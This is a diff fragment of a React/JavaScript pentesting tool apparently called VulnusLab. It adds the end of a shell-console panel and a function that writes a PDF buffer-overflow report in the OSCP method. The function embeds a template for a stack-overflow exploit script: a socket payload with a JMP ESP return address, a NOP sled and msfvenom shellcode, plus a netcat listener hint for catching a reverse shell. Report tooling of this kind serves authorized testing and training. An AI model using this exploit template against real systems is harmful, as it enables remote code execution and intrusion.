+                        style={{flex: 1, padding: "9px 11px", background: "#000",
+                          color: "#4ade80", border: "1px solid #14532d", borderRadius: 5,
+                          fontFamily: "'JetBrains Mono', monospace", fontSize: 13, outline: "none"}}/>
+                      <button onClick={sendCmd}
+                        style={{padding: "9px 22px",
+                          background: "linear-gradient(135deg, #22c55e, #16a34a)",
+                          color: "#000", fontWeight: 800, letterSpacing: 1.5,
+                          border: "none", borderRadius: 5, cursor: "pointer", fontSize: 12,
+                          boxShadow: "0 2px 8px rgba(34,197,94,0.3)"}}>SEND</button>
+                    </>
+                  ) : (
+                    <span style={{fontSize: 11, color: "#94a3b8", fontStyle: "italic"}}>
+                      {activeShell ? "One-shot data dump — no interactive shell" : "waiting for shell…"}
+                    </span>
+                  )}
+                </div>
+              </div>
+            )}
+          </div>
+
+          {/* Status pills */}
+          <div style={{display: "flex", gap: 8, flexWrap: "wrap"}}>
+            <span style={{padding: "5px 10px", fontSize: 10, fontWeight: 700,
+              background: "rgba(34,197,94,0.12)", color: "#4ade80", borderRadius: 5,
+              border: "1px solid rgba(34,197,94,0.3)"}}>{successCount} success</span>
+            <span style={{padding: "5px 10px", fontSize: 10, fontWeight: 700,
+              background: "rgba(220,38,38,0.12)", color: "#f87171", borderRadius: 5,
+              border: "1px solid rgba(220,38,38,0.3)"}}>{failedCount} failed</span>
+            <span style={{padding: "5px 10px", fontSize: 10, fontWeight: 700,
+              background: "rgba(100,116,139,0.12)", color: "#94a3b8", borderRadius: 5,
+              border: "1px solid rgba(100,116,139,0.3)"}}>○ {notRunCount} not run</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
 
 
 /* ═══════════════════════════════════════════════════════════════════════════
@@ -14732,6 +18123,221 @@ const BOF_PHASES = [
    module gives us a single source of truth for the form+log+shell UI.
 */
 
+function generateBOFReport({targetIP, targetPort, prefix, crashAt, eipValue, offset, badChars, jmpEsp, jmpModule, lhost, lport, payload, shellcode, notes, scripts, date, pdfConfig}) {
+  const _cfg = pdfConfig || {};
+  const _doGen = () => {
+    const _pwd = _cfg.password, _encrypt = _cfg.encrypt !== false && _pwd;
+    const doc = new jsPDF({unit:"mm", format:"a4",
+      ...(_encrypt ? {encryption: {userPassword: _pwd, ownerPassword: _pwd,
+        userPermissions: ["print","modify","copy","annot-forms"]}} : {})
+    });
+    const pageW=210, margin=12, contentW=pageW-margin*2;
+    const BLUE=[59,130,246], DARK=[15,23,42], GRAY=[100,116,139];
+    const LIGHT=[241,245,249], WHITE=[255,255,255], LBLUE=[220,230,245];
+    const GREEN=[22,163,74], RED=[220,38,38];
+    let y=18, _sn=0;
+    const fillR=(x,yy,w,h,c)=>{doc.setFillColor(...c);doc.rect(x,yy,w,h,"F");};
+    const txt=(t,x,yy,sz,c,bold,align)=>{doc.setFont("Arial",bold?"bold":"normal");doc.setFontSize(sz||10);doc.setTextColor(...(c||DARK));doc.text(String(t),x,yy,{align:align||"left"});};
+    const chk=n=>{if(y+n>278){doc.addPage();y=18;drawHdr();}};
+    const sHead=(title,yy)=>{_sn++;fillR(margin,yy,contentW,9,LBLUE);txt(_sn+". "+title,margin+4,yy+6.2,10,BLUE,true);return yy+13;};
+    const drawHdr=()=>{txt("VulnusLab — Buffer Overflow Report",margin,10,7,GRAY);txt(date,pageW-margin,10,7,BLUE,false,"right");};
+    const CODE_BG=[232,240,255], CODE_FG=[15,30,80];
+    const mono=(t,x,yy,sz)=>{doc.setFont("Courier","normal");doc.setFontSize(sz||7.5);doc.setTextColor(...CODE_FG);doc.text(String(t),x,yy);};
+
+    // Cover
+    fillR(0,0,pageW,64,DARK);
+    // VulnusLab shield logo + wordmark
+    {
+      const sx = pageW/2, sy = 14, w = 12, h = 14;
+      doc.setFillColor(15,23,42);
+      doc.setDrawColor(59,130,246); doc.setLineWidth(0.6);
+      doc.lines([
+        [w*0.45,0],[w*0.55,h*0.15],[0,h*0.5],
+        [-w*0.55,h*0.5],[-w*0.45,-h*0.15],[-w*0.45,-h*0.4],
+        [0,-h*0.1],[w*0.45,-h*0.4],[0,h*0.4]
+      ], sx-w*0.45, sy-h*0.4, [1,1], 'FD');
+      doc.setFont("helvetica","bold"); doc.setFontSize(10); doc.setTextColor(59,130,246);
+      doc.text("V", sx, sy + 1, {align:"center"});
+      doc.setFont("helvetica","bold"); doc.setFontSize(7);
+      doc.setTextColor(241,245,249);
+      doc.text("VULNUS", sx - 1, sy + 10, {align:"right"});
+      doc.setTextColor(59,130,246);
+      doc.text("LAB", sx, sy + 10, {align:"left"});
+    }
+    txt("BUFFER OVERFLOW REPORT",pageW/2,38,17,[255,255,255],true,"center");
+    txt("Stack-Based Exploitation — OSCP Methodology",pageW/2,48,10,GRAY,false,"center");
+    y=74;
+    const rows=[["Target",`${targetIP||"—"}:${targetPort||"—"}`],["Prefix",prefix||"—"],["Date",date],["Classification","CONFIDENTIAL"],["Report Type","Buffer Overflow Exploitation"]];
+    fillR(margin,y,contentW,8,DARK); txt("FIELD",margin+3,y+5.5,8,WHITE,true); txt("VALUE",margin+55,y+5.5,8,WHITE,true); y+=8;
+    rows.forEach(([f,v],i)=>{fillR(margin,y,contentW,8,i%2===0?LIGHT:WHITE);txt(f,margin+3,y+5.5,8.5,GRAY,true);txt(String(v),margin+55,y+5.5,8.5,DARK);y+=8;});
+    y+=8;
+
+    // ── TRUST STATEMENT (vulntemplate block 3) ──
+    fillR(margin, y, contentW, 16, LBLUE);
+    fillR(margin, y, 3, 16, BLUE);
+    doc.setFont("Arial","bold"); doc.setFontSize(9); doc.setTextColor(...BLUE);
+    doc.text("VERIFIED BY VULNUSLAB", margin+8, y+6);
+    doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor(...DARK);
+    doc.text("Each phase below was executed against the target binary on the analyst's workstation. EIP offset, bad", margin+8, y+11);
+    doc.text("characters, and JMP ESP gadget were validated empirically — no theoretical or static-analysis claims.", margin+8, y+14);
+    y += 22;
+
+    // Exploitation Summary
+    chk(60); y=sHead("Exploitation Summary",y);
+    const sumRows=[
+      ["Crash Point",crashAt ? `~${crashAt} bytes` : "?? bytes",""],
+      ["EIP Offset",offset ? `${offset} bytes` : "Not found",""],
+      ["EIP Value (pattern)",eipValue||"Not recorded",""],
+      ["Bad Characters",badChars||"None identified",""],
+      ["JMP ESP Address",jmpEsp||"Not found",jmpModule||""],
+      ["LHOST / LPORT",`${lhost||"??"} / ${lport||"4444"}`,""],
+      ["Payload",payload||"—",""],
+    ];
+    fillR(margin,y,contentW,8,DARK);
+    txt("PARAMETER",margin+3,y+5.5,8,WHITE,true);txt("VALUE",margin+55,y+5.5,8,WHITE,true);txt("MODULE",margin+120,y+5.5,8,WHITE,true);y+=8;
+    sumRows.forEach(([f,v,m],i)=>{
+      fillR(margin,y,contentW,8,i%2===0?LIGHT:WHITE);
+      txt(f,margin+3,y+5.5,8.5,GRAY,true);
+      const col=v&&v!=="Not found"&&v!=="Not found"?GREEN:RED;
+      txt(v,margin+55,y+5.5,8.5,col,true);
+      if(m) txt(m,margin+120,y+5.5,7.5,GRAY);
+      y+=8;
+    }); y+=8;
+
+    doc.addPage(); y=18; drawHdr();
+
+    // Each Phase notes + scripts
+    BOF_PHASES.forEach((ph)=>{
+      const n = notes[String(ph.id)]||"";
+      const script = scripts ? scripts[ph.id] : null;
+      // Calculate block height before placing heading to avoid orphaned headers
+      const scriptLines = script ? script.split("\n").flatMap(line=>{
+        // wrap long lines so shellcode doesn't overflow
+        const chunks=[]; let s=line;
+        while(s.length>86){chunks.push(s.substring(0,86));s=s.substring(86);}
+        chunks.push(s); return chunks;
+      }) : [];
+      const scriptH = script ? scriptLines.length*5+8 : 0;
+      const noteLines = n.trim() ? doc.splitTextToSize(n,contentW-8) : [];
+      const noteH = n.trim() ? Math.max(10,noteLines.length*4.5+6) : 0;
+      const totalH = 24 + noteH + (noteH>0?6:0) + scriptH;
+      const fitsOnePage = totalH <= 256;
+      // If fits on one page: ensure enough room before heading, then NO inner chk
+      if(fitsOnePage && y+totalH>278){ doc.addPage(); y=18; drawHdr(); }
+      else if(!fitsOnePage){ chk(24); }
+      y=sHead(`Phase ${ph.id}: ${ph.name}`,y);
+      fillR(margin,y,contentW,7,LIGHT); txt(ph.desc,margin+4,y+5,8.5,GRAY); y+=11;
+      // Notes
+      if(n.trim()){
+        if(!fitsOnePage) chk(noteH+4);
+        fillR(margin,y,contentW,noteH,[240,253,244]);
+        fillR(margin,y,3,noteH,GREEN);
+        doc.setFont("Arial","normal");doc.setFontSize(8);doc.setTextColor(...DARK);
+        doc.text(noteLines,margin+6,y+5);
+        y+=noteH+6;
+      }
+      // Generated script
+      if(script){
+        if(!fitsOnePage) chk(scriptH+4);
+        fillR(margin,y,contentW,scriptH,CODE_BG);
+        fillR(margin,y,3,scriptH,BLUE);
+        scriptLines.forEach((line,li)=>{
+          mono(line, margin+6, y+5+li*5, 6.8);
+        });
+        y+=scriptH+5;
+      }
+      if(!n.trim()&&!script){
+        fillR(margin,y,contentW,7,[254,242,242]);txt("No notes recorded for this phase.",margin+4,y+5,8,GRAY);y+=11;
+      }
+    });
+
+    // Final exploit script
+    if(offset&&jmpEsp){
+      const leBytes=jmpEsp.replace(/0x/i,"").match(/../g)?.reverse().map(h=>"\\x"+h).join("")||"\\x??\\x??\\x??\\x??";
+      const script=[
+        `import socket`,``,
+        `target  = "${targetIP||'TARGET_IP'}"`,
+        `port    = ${targetPort||9999}`,
+        `prefix  = "${prefix||'OVERFLOW1 '}"`,
+        `offset  = ${offset}`,
+        `retn    = b"${leBytes}"   # ${jmpEsp} little-endian`,
+        `padding = b"\\x90" * 16   # NOP sled`,
+        `# Paste msfvenom output here:`,
+        `shellcode = b"${shellcode||'# PASTE SHELLCODE'}"`,``,
+        `payload  = prefix.encode() + b"A" * offset + retn + padding + shellcode`,
+        `s = socket.socket()`,
+        `s.connect((target, port))`,
+        `s.recv(1024)`,
+        `s.send(payload + b"\\r\\n")`,
+        `print("[*] Exploit sent! Catch shell: nc -lvnp ${lport||4444}")`,
+      ];
+      const fsLines=script.flatMap(line=>{
+        const chunks=[]; let s=line;
+        while(s.length>86){chunks.push(s.substring(0,86));s="  "+s.substring(86);}
+        chunks.push(s); return chunks;
+      });
+      const fsH=fsLines.length*5.5+8;
+      chk(fsH+20); y=sHead("Final Exploit Script",y);
+      fillR(margin,y,contentW,fsH,CODE_BG); fillR(margin,y,3,fsH,GREEN);
+      fsLines.forEach((line,li)=>{ mono(line,margin+6,y+5.5+li*5.5,7.5); });
+      y+=fsH+6;
+      y+=6;
+    }
+
+    // ── APPENDIX (vulntemplate block 11) ──
+    chk(80); y=sHead("Appendix",y);
+    doc.setFont("Arial","bold"); doc.setFontSize(9); doc.setTextColor(...DARK);
+    doc.text("A. Methodology", margin, y+5); y+=8;
+    doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor(...GRAY);
+    const _bofMethod = doc.splitTextToSize(
+      "Stack-based buffer overflow exploitation follows the standard 7-phase OSCP methodology: Fuzz -> Find Offset -> Confirm EIP Control -> Detect Bad Characters -> Find JMP ESP gadget -> Generate Shellcode -> Deliver Exploit. Each phase is independently verifiable from the artifacts captured in this report.",
+      contentW-4);
+    _bofMethod.forEach(l=>{ chk(5); doc.text(l, margin+2, y+3.5); y+=4; });
+    y+=4;
+
+    doc.setFont("Arial","bold"); doc.setFontSize(9); doc.setTextColor(...DARK);
+    doc.text("B. References", margin, y+5); y+=8;
+    doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor(...BLUE);
+    const _bofRefs = [
+      "OSCP Buffer Overflow Methodology — https://www.offensive-security.com/pwk-oscp/",
+      "Mona.py (Immunity Debugger plugin) — https://github.com/corelan/mona",
+      "msfvenom payload reference — https://docs.metasploit.com",
+      "CVE / NVD — https://nvd.nist.gov",
+    ];
+    _bofRefs.forEach(l=>{ chk(5); doc.text(l, margin+2, y+3.5); y+=4.5; });
+    y+=6;
+
+    // End of report contact block
+    chk(34);
+    const eY = y + 4;
+    fillR(margin, eY, contentW, 30, LIGHT);
+    fillR(margin, eY, 3, 30, BLUE);
+    txt("— END OF REPORT —", pageW/2, eY+8, 10, BLUE, true, "center");
+    txt("Generated by VulnusLab — automated exploitation testing by VulnusLab engine.", pageW/2, eY+14, 6.5, GRAY, false, "center");
+    txt("All findings require manual verification. This document is CONFIDENTIAL — restricted to authorized personnel only.", pageW/2, eY+18, 6, GRAY, false, "center");
+    txt("vulnuslab.com  ·  support@vulnuslab.com", pageW/2, eY+25, 7, BLUE, true, "center");
+
+    // Border + watermark + footer on all pages
+    const _wmB = _cfg.watermark;
+    const _ftrB = _cfg.customFooterText || ("VulnusLab | "+((_cfg.confidentiality)||"CONFIDENTIAL")+"  ·  vulnuslab.com");
+    const total=doc.internal.getNumberOfPages();
+    for(let i=1;i<=total;i++){
+      doc.setPage(i);
+      if(_wmB){
+        const _wmStr = String(_wmB);
+        doc.saveGraphicsState();
+        try { doc.setGState(new doc.GState({opacity:0.10})); } catch(_){}
+        doc.setFont("Arial","bold"); doc.setFontSize(20); doc.setTextColor(220,38,38);
+        doc.text(_wmStr, 105, 148.5, {angle:30, align:"center"});
+        doc.restoreGraphicsState();
+      }
+      doc.setDrawColor(...BLUE);doc.setLineWidth(1.2);doc.rect(0,0,210,297,"S");
+      if(i>=2){txt(_ftrB,margin,290,6.5,GRAY);txt("Page "+i+" of "+total,pageW-margin,290,6.5,BLUE,false,"right");}
+    }
+    doc.save(`bof_${_pdfFn(targetIP)}_${_pdfDt()}.pdf`);
+  };
+  _doGen();
+}
 
 // ── EMBEDDED TERMINAL WIDGET ──────────────────────────────────
 function TerminalWidget({apiUrl, title, color, presetCmds, onClose}) {
